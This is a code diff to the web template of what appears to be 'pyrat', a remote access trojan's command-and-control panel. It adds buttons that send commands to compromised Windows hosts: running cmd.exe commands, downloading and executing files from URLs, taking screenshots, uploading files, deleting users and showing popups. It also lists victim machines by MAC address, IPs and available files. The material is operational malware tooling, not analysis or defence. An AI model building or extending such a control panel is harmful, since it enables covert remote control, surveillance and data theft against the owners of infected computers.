@@ -6,61 +6,96 @@
     <meta charset="UTF-8">
     <title>:: pyrat :: command center</title>
     <style> td, th { border: 1px solid black; } </style>
+    <script src="https://code.jquery.com/jquery-latest.pack.js" type="text/javascript"></script>
 </head>
 
 <body>
 {% if user.is_authenticated %}
+    <script language="javascript" type="text/javascript">
+       $('document').ready(function(){
+       setInterval(function(){
+        $.ajax({
+          url: "/clients/ #table_cont",
+        }).done(function ( data ) {
+          $("#fresh_table_cont").html(data);
+
+        });
+        }, 10000);
+        });
+    </script>
     <div align="right">
     Logged user: <b>{{ user.username }}</b> // <a href="/accounts/logout/">LOGOUT</a>
     </div>
+    <div align="center" id="logo">
+<pre>
+ .----------------.  .----------------.  .----------------.  .----------------.  .----------------.
+| .--------------. || .--------------. || .--------------. || .--------------. || .--------------. |
+| |   ______     | || |  ____  ____  | || |  _______     | || |      __      | || |  _________   | |
+| |  |_   __ \   | || | |_  _||_  _| | || | |_   __ \    | || |     /  \     | || | |  _   _  |  | |
+| |    | |__) |  | || |   \ \  / /   | || |   | |__) |   | || |    / /\ \    | || | |_/ | | \_|  | |
+| |    |  ___/   | || |    \ \/ /    | || |   |  __ /    | || |   / ____ \   | || |     | |      | |
+| |   _| |_      | || |    _|  |_    | || |  _| |  \ \_  | || | _/ /    \ \_ | || |    _| |_     | |
+| |  |_____|     | || |   |______|   | || | |____| |___| | || ||____|  |____|| || |   |_____|    | |
+| |              | || |              | || |              | || |              | || |              | |
+| '--------------' || '--------------' || '--------------' || '--------------' || '--------------' |
+ '----------------'  '----------------'  '----------------'  '----------------'  '----------------'
+</pre>
+    </div>
     <br>
-    <form action="/command/" method="post" target="_blank">
-    Enter command with args:
-    <input type="text" name="command" size="100"><br>
-    <button type="submit">EXEC</button>
+	Insert params
+	<br>
+    <br>
+	<input type ="text" name="params" size="100" id="params">
+	<br>
+    <br>
+	Select command:
+	<form action="/command/" method="post" target="_blank" id="kurwa">
+	<input type="hidden" name="command" size="100" id="command"> 
+	<br>
+	<br>
+	<input type="image" id="#deluser" src="/static/pyrat_server/img/delete.png" alt="submit Button" hspace="20" title="#deluser"
+           onMouseOut="this.src='/static/pyrat_server/img/delete.png'" onMouseOver="this.src='/static/pyrat_server/img/delete_bl.png'">
+	<input type="image" id="#popup" src="/static/pyrat_server/img/popup.png" alt="submit Button" hspace="20" title="#popup($Title,$Text)"
+           onMouseOut="this.src='/static/pyrat_server/img/popup.png'" onMouseOver="this.src='/static/pyrat_server/img/popup_bl.png'">
+	<input type="image" id="#run_command" src="/static/pyrat_server/img/command.png" alt="submit Button" hspace="20" title="#run_command($C:\windows\system32\cmd.exe,$/C,$Command,$Param) [use \\ for slash]"
+           onMouseOut="this.src='/static/pyrat_server/img/command.png'" onMouseOver="this.src='/static/pyrat_server/img/command_bl.png'">
+	<input type="image" id="#downloader" src="/static/pyrat_server/img/downloader.png" alt="submit Button" hspace="20" title="#downloader($Url,$Path,$Y)"
+           onMouseOut="this.src='/static/pyrat_server/img/downloader.png'" onMouseOver="this.src='/static/pyrat_server/img/downloader_bl.png'">
+	<input type="image" id="#screenshot" src="/static/pyrat_server/img/screenshot.png" alt="submit Button" hspace="20" title="#screenshot()"
+           onMouseOut="this.src='/static/pyrat_server/img/screenshot.png'" onMouseOver="this.src='/static/pyrat_server/img/screenshot_bl.png'">
+	<input type="image" id="#upload" src="/static/pyrat_server/img/upload.png" alt="submit Button" hspace="20" title="#upload($Path)"
+           onMouseOut="this.src='/static/pyrat_server/img/upload.png'" onMouseOver="this.src='/static/pyrat_server/img/upload_bl.png'">
         <br>
         <br>
-        Sample:
-        <br>
-        <br>
-        <li>#deluser</li>
-        <li>#popup($Title,$Text)</li>
-        <li>#run_command($C:\windows\system32\cmd.exe,$/C,$Command,$Param) [use \\ for slash]</li>
-        <li>#downloader($Url,$Path,$Y)</li>
-        <li>#screenshot()</li>
-        <li>#upload($Path)</li>
-        <br>
-        <table>
-            <thead>
-                <tr>
-                    <th>Id</th> <th style="width:10%">MAC Adress</th> <th>OS</th> <th>System Name</th> <th>Internal IP</th> <th>External IP</th> <th>UniqueID</th> <th style="width:15%">Command</th> <th style="width:30%">Command Result</th> <th>Online</th> <th>Available files</th>
-                </tr>
-            </thead>
-            <tbody>
-                {% for i in host_list %}
-                    <tr>
-                        {% autoescape off %}
-                                <td>{{ i.0 }}</td>
-                                <td><input type="checkbox" name="det_mac_{{ i.0 }}" value="{{ i.1 }}">{{ i.1 }}</td>
-                                <td>{{ i.2 }}</td>
-                                <td>{{ i.3 }}</td>
-                                <td>{{ i.4 }}</td>
-                                <td>{{ i.5 }}</td>
-                                <td>{{ i.6 }}</td>
-                                <td>{{ i.7 }}</td>
-                                <td>{{ i.8 }}</td>
-                                {% if i.10 in time_list_str %}
-                                    <td bgcolor="#33cc33">{{ i.10 }}s. ago</td>
-                                {% else %}
-                                    <td bgcolor="#FF0000">{{ i.10 }}</td>
-                                {% endif %}
-                                <td><a href="/listfiles/{{ i.11 }}/" target="_blank">/{{ i.11 }}/</td>
-                        {% endautoescape %}
-                    </tr>
-                {% endfor %}
-            </tbody>
-        </table>
+        <div id="fresh_table_cont"></div>
     </form>
+	<script type="text/javascript">
+	$(document).ready(function(){
+	$('input').click(function(e){
+	if  (e.target.id != 'params') {
+		if (e.target.id == '#screenshot' || e.target.id =='#deluser') {
+		var idClicked = e.target.id;
+		var suma = idClicked + '()';
+		}
+		else {
+		var idClicked = e.target.id;
+		var params = $('#params').val();
+			if (params.length == 0) {
+			alert('For command != screenshot or deluser, you must put some params!');
+			e.preventDefault();
+			}
+			else {
+			}
+		var suma = idClicked + '(' + params + ')';
+		}
+	}
+	else {
+	var suma = '';
+	}
+    $('#command').val(suma);
+    });
+    });
+	</script>
 {% else %}
     User not authenticated.
     <br>
